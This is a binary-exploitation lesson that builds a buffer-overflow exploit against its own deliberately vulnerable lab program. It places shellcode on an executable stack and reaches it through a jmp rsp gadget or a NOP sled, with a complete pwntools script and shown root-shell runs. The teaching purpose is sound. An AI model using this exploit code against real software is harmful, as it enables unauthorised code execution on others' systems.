---
title: "Lesson 4.2: Jumping into stack shellcode with jmp rsp"
image:
  path: /assets/img/covers/pwn-4-2-jumping-stack-shellcode-jmp-rsp.webp
  alt: "Jumping into stack shellcode with jmp rsp"
date: 2022-11-17 07:41:00 +0700
categories: ["Binary Exploitation", "Pwn · Shellcode"]
tags: [pwn, nx, shellcode, jmp-rsp]
render_with_liquid: false
---

Lesson 4.1 gave us working shellcode, but we tested it in an artificial RWX region. This lesson puts the two pieces together: use a buffer overflow (Part 3) to place shellcode on the stack and force RIP to jump into it. This is the most primitive stack overflow technique, and it only works when NX is off (the stack is executable). We do it two ways: jump straight to the stack address (easy to understand, but needs ASLR off), and use a `jmp rsp` gadget (works even with ASLR on). By the end you will see why NX is almost always on in practice, which is why this technique rarely works, and why we need ROP in Part 6.

![Stack layout for the jmp rsp technique](/assets/img/pwn/pwn-4-2-jumping-stack-shellcode-jmp-rsp.svg)
_Saved RIP is overwritten with the address of a jmp rsp gadget, which lands on the shellcode placed right after it._

Part: 4 (Shellcode) | Time: about 55 minutes reading plus lab | Difficulty: medium

**Prerequisites:** Lesson 3.2 (finding the offset with cyclic, overwriting saved RIP), Lesson 4.1 (writing shellcode), Lesson 2.2 (gdb), Lesson 2.3 (checksec). You should already have a rough idea of what ASLR is (covered in detail in Part 5).

**Tools:** pwntools, gdb + pwndbg, checksec, gcc, readelf. Test environment: Ubuntu 24.04.4, glibc 2.39, gcc 13.3.0.

## Goals

By the end of this lesson you will understand what NX is, why the stack is not executable by default, and what `-z execstack` does. You will place shellcode on the stack through an overflow bug and force RIP to jump into it. You will find the offset to saved RIP with cyclic (a review of Lesson 3.2). You will understand and use the `jmp rsp` gadget to jump into shellcode without knowing the stack address (works even with ASLR on). You will be able to explain why shellcode-on-stack is rare in practice, and why the next step is ROP.

## 1. Theory

### NX, and why the stack usually does not run code

NX (No-eXecute, called XD on Intel, generalized as DEP, Data Execution Prevention) is a mechanism that marks data pages (stack, heap, writable regions) as non-executable. When the CPU hits a jump into a page without execute permission, it raises a fault and the kernel kills the process. The purpose is direct, blocking exactly the attack in this lesson, putting shellcode on the stack and running it.

The NX state of an ELF is decided by the `GNU_STACK` segment in the program header. If its flags are `RW`, the stack is not executable (NX on). If they are `RWE`, the stack is executable (NX off). gcc creates `GNU_STACK` as `RW` by default. To turn NX off for learning purposes, we compile with `-z execstack`, which sets `GNU_STACK` to `RWE`.

### Binary configuration for this lesson

We deliberately turn off several mitigations so we can isolate the shellcode-on-stack technique.

```
-z execstack          stack is executable (NX off) -> this is the critical condition
-fno-stack-protector  drop the canary so the overflow reaches saved RIP directly (review of Lesson 3.2)
-no-pie               fixed code address -> the jmp rsp gadget has a fixed address
-fcf-protection=none  drop endbr64 (CET), for cleanliness, does not affect this lesson
```

### Two ways to jump into shellcode

Once we control saved RIP (through the overflow), we need RIP to point into the shellcode sitting on the stack. There are two ways.

Way 1, jump straight to the stack address. Place the shellcode right inside the buffer, then overwrite saved RIP with the address of that same buffer. The problem is that we have to know the buffer address. If ASLR (Address Space Layout Randomization, the mechanism that randomizes addresses on every run) is on, the stack address changes every run, so we cannot guess it. This way only demonstrates the idea when ASLR is off (or when we have already leaked the stack address, which we leave for Part 5).

Way 2, use the `jmp rsp` gadget. The trick is that right after the `ret` instruction pops the saved RIP value, the `rsp` register points to the slot just above saved RIP, which is exactly where we place shellcode (if we put the shellcode right after the 8 bytes of saved RIP). So if we overwrite saved RIP with the address of a `jmp rsp` instruction (opcode `ff e4`), then `ret` jumps into `jmp rsp`, and `jmp rsp` jumps on into the shellcode. The nice part is that we do not need to know the stack address at all, only the address of the `jmp rsp` gadget. In a no-PIE binary the gadget address is fixed, so this way works EVEN WITH ASLR on. The condition is that the binary contains the two bytes `ff e4` somewhere in an executable region. Small binaries often do not have it by default, so in the lab we plant one with a function that is never called but contains inline asm `jmp rsp`.

Here is the payload layout for way 2.

```
low address
  [ 'A' * offset    ]   <- padding from start of buf to saved RIP (measured with cyclic)
  [ &(jmp rsp)  (8) ]   <- overwrite saved RIP with the address of the jmp rsp gadget
  [ shellcode       ]   <- after ret, rsp points exactly here
high address
```

Since `ret` pops the 8 bytes of `&(jmp rsp)` and then advances `rsp` by 8, `rsp` points right at `shellcode`. `jmp rsp` executes, and the CPU jumps into `shellcode`. Done.

## 2. Demo

### Sample binary

```c
// src.c (lab 4.2)
#include <stdio.h>
#include <unistd.h>

void gadget(void) {
    __asm__ __volatile__("jmp *%rsp");   // plants the two bytes ff e4 into .text
}

void vuln(void) {
    char buf[64];
    puts("data:");
    read(0, buf, 400);          // reads 400 bytes into buf[64]: overflow
}

int main(void) {
    setvbuf(stdout, 0, 2, 0);
    vuln();
    return 0;
}
```

The `gadget` function is never called. We only need it so that the two bytes `ff e4` (`jmp rsp`) exist somewhere in the executable `.text` section, at a fixed address.

Compile with NX off and confirm `GNU_STACK` is `RWE`.

```bash
gcc -z execstack -fno-stack-protector -no-pie -fcf-protection=none -O0 -g -o vuln src.c
readelf -lW vuln | grep GNU_STACK
```

Here is the real output, note the `RWE` flag.

```
  GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RWE 0x10
```

checksec confirms the configuration, in this real output, trimmed.

```
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
```

The lines `Stack: Executable` and `Has RWX segments` are the gold signal that the stack can run code.

### Step 1: find the offset with cyclic

Review of Lesson 3.2. Feed a De Bruijn pattern to crash, then read it back.

```python
from pwn import *
open('pat.txt', 'wb').write(cyclic(200))
```

```gdb
$ gdb -q -batch -ex 'run < pat.txt' -ex 'info registers rip rsp' -ex 'x/gx $rsp' ./vuln
Program received signal SIGSEGV, Segmentation fault.
0x000000000040117e in vuln () at src.c:24
rip            0x40117e            0x40117e <vuln+47>
rsp            0x7fffffffea38      0x7fffffffea38
0x7fffffffea38: 0x6161617461616173
```

Note that the crash happens right at the `ret` instruction (`vuln+47`), not after the jump already happened, because the pattern value `0x6161...` is a non-canonical address so `ret` faults on the spot. The 8-byte value at `$rsp` is exactly the saved RIP we overflowed into, so look it up with `cyclic_find`.

```python
>>> cyclic_find(p64(0x6161617461616173)[:4])     # first 4 bytes = b'saaa'
72
```

The offset is 72, made up of 64 bytes of buffer plus 8 bytes of saved RBP.

### Step 2: find the jmp rsp gadget

```python
>>> context.arch = 'amd64'
>>> elf = ELF('./vuln')
>>> hex(next(elf.search(asm('jmp rsp'), executable=True)))
'0x40114a'
```

`asm('jmp rsp')` produces the two bytes `ff e4`, and `elf.search(..., executable=True)` looks for them in executable segments. We get a fixed address `0x40114a` (no-PIE, so it never changes).

### Step 3: exploit with jmp rsp (works even with ASLR on)

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./vuln', checksec=False)

sc = asm(shellcraft.amd64.linux.sh())            # 48 bytes, or use the hand-written one from Lesson 4.1
offset = 72
jmp_rsp = next(elf.search(asm('jmp rsp'), executable=True))

payload = flat(
    b'A' * offset,     # padding up to saved RIP
    p64(jmp_rsp),      # RIP = jmp rsp
    sc,                # when ret happens, rsp points here
)
io = process('./vuln')
io.sendafter(b'data:\n', payload)
sleep(0.3)             # let the shellcode exec /bin/sh before we type a command
io.sendline(b'echo ===PWNED_4_2===; id; echo ===END===')
io.sendline(b'exit')
print(io.recvall(timeout=5).decode(errors='replace'))
```

Here is a real run, with ASLR ON (`/proc/sys/kernel/randomize_va_space = 2`).

```
[*] gadget jmp rsp @ 0x40114a
===PWNED_4_2===
uid=0(root) gid=0(root) groups=0(root)
===END===
```

We get a root shell. Running it 8 out of 8 times gives a shell even with ASLR on, because `jmp rsp` does not care where the stack is, it just jumps to whatever `rsp` currently holds.

### Jumping straight into the stack (only with ASLR off)

To see why ASLR breaks the direct jump, we turn off ASLR and grab the buffer address.

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
gdb -q -batch -ex 'break read' -ex 'run < /dev/null' -ex 'printf "&buf=%p\n", $rsi' ./vuln
# &buf=0x7fffffffe9f0
```

Then we place the shellcode AFTER saved RIP, pad it with a NOP sled (a run of `0x90` instructions that do nothing, "sliding" into the shellcode) and jump into the middle of the sled. The NOP sled gives us some tolerance for a few dozen bytes of address drift between gdb and pwntools.

```python
buf_addr = 0x7fffffffe9f0
sled = b'\x90' * 256
target = buf_addr + offset + 8 + 128             # jump into the middle of the sled
payload = flat(b'A' * offset, p64(target), sled, sc)
```

Here is a real run, with ASLR OFF.

```
[*] buf @ 0x7fffffffe9f0, jumping into middle of NOP sled @ 0x7fffffffeac0 (ASLR must be off)
===PWNED_4_2===
uid=0(root) gid=0(root) groups=0(root)
===END===
```

Also gets a root shell. But turn ASLR back on and `buf_addr` changes every run, so hardcoding it misses immediately. That is the lesson, jumping straight into the stack needs a known address, and ASLR denies us that unless we have already leaked it. The `jmp rsp` way avoids that problem.

### Why this rarely works in practice, and what comes next

This whole lesson only works because of `-z execstack`. On every normally compiled binary today, NX is on, `GNU_STACK` is `RW`, and the stack does not run code. Jumping into shellcode on the stack gets an immediate SIGSEGV. So shellcode-on-stack survives mostly in CTFs that deliberately turn NX off, or on old embedded systems. When NX is on, we cannot bring our own code in and run it, so we have to reuse code that already exists in the binary and libc. That is ret2libc and ROP (Return-Oriented Programming), covered in Part 6. Shellcode is not useless, it is still the final payload once we have obtained an RWX region some other way (for example calling `mprotect` through ROP and then jumping into shellcode), but it is no longer the first step the way it was when stacks were executable.

## 3. Lab

All the code is in the Lab section below (`src.c`, `build.sh`, `exploit.py`, `transcript.txt`, `README.md`). `exploit.py` has two modes: `jmp rsp` by default, and `DIRECT BUF=0x...` for the direct jump (needs ASLR off).

- Task: compile `vuln` with `build.sh`, measure the offset yourself with cyclic, find the `jmp rsp` gadget, build a payload that gets a shell with `jmp rsp` while ASLR is ON.
- Extra: try the direct jump into the stack with ASLR off, grab `&buf` yourself with gdb, use a NOP sled. Then turn ASLR back on and watch it miss (SIGSEGV), to really feel why you need `jmp rsp` or a leak.

Hints, in steps.

- Hint 1: the offset here is not 64 but 64 + 8 (saved RBP). Always measure with cyclic, do not guess.
- Hint 2: the `jmp rsp` layout is `b'A'*offset + p64(jmp_rsp) + shellcode`, with shellcode placed AFTER saved RIP, not inside the buffer.
- Hint 3: find `jmp rsp` with `elf.search(asm('jmp rsp'), executable=True)`. Remember `context.arch='amd64'`.
- Hint 4: if you get a shell but no output from `id`, add `sleep(0.3)` before sending the command (see Common pitfalls).

As a check, consider why `jmp rsp` works with ASLR on, while jumping straight to `buf_addr` does not.

## 4. Key takeaways

- Condition: NX off (stack `RWE`), no canary, know the offset to saved RIP.
- `GNU_STACK` being `RWE` means the stack is executable; check it with `readelf -lW` or checksec.
- Jumping straight to `buf_addr`: needs to know the stack address, only works with ASLR off or after a leak.
- `jmp rsp`: overwrite saved RIP with the address of the `ff e4` gadget, place shellcode right after saved RIP, works even with ASLR on.
- After `ret`, `rsp` points to the slot just above saved RIP, which is why `jmp rsp` lands exactly on the shellcode.
- In practice NX is on, so shellcode-on-stack is rarely usable, which is why we study ROP (Part 6).

## 5. Common pitfalls

- Forgetting `-z execstack`: the stack does not run code, jumping into shellcode is an instant SIGSEGV. Check that `GNU_STACK` is `RWE`.
- Jumping straight to a stack address while ASLR is on: the address changes every run, hardcoding it misses. Either turn ASLR off to learn, use `jmp rsp`, or leak (Part 5).
- Placing shellcode inside the buffer and then using `jmp rsp`: wrong layout. `jmp rsp` needs the shellcode placed RIGHT AFTER saved RIP, not before it inside the buffer.
- Getting a shell but seeing no output: the program reads with one large, greedy `read`, so if you send a command right after the payload it gets swallowed into the same buffer and the shell has no input left. In this lab, without a `sleep`, the success rate is only about 50 percent. Adding `sleep(0.3)` before sending the command makes it a stable 8 out of 8. This is a harness quirk, not a technical bug.
- The `jmp rsp` gadget does not exist in a real binary: many binaries do not have `ff e4` lying around. In that case look for `jmp rax`, `call rsp`, or another approach; in the lab we plant a gadget on purpose to demonstrate the idea.
- Shellcode overwriting itself: shellcode on the stack, when it `push`es, writes to a lower address, meaning below the shellcode itself; for short shellcode a few dozen bytes long this does not matter, but longer shellcode needs to watch for it.

## 6. Further reading

- "Smashing The Stack For Fun And Profit" (Aleph One): the original write-up on shellcode-on-stack (x86, before NX).
- picoCTF and other older challenges that use `-z execstack`: look for ones that disable NX to practice.
- Documentation on NX/DEP and `GNU_STACK` (man `ld`, `execstack`).
- Part 6 of the series: ret2libc and ROP, the path forward when NX is on.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 4.2</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-pwn/4.2.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-pwn/4.2/build.sh" download><i class="fa-solid fa-file-code"></i>build.sh</a>
<a class="lab-file" href="/assets/labs-pwn/4.2/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
<a class="lab-file" href="/assets/labs-pwn/4.2/src.c" download><i class="fa-solid fa-file-code"></i>src.c</a>
</div>
</div>
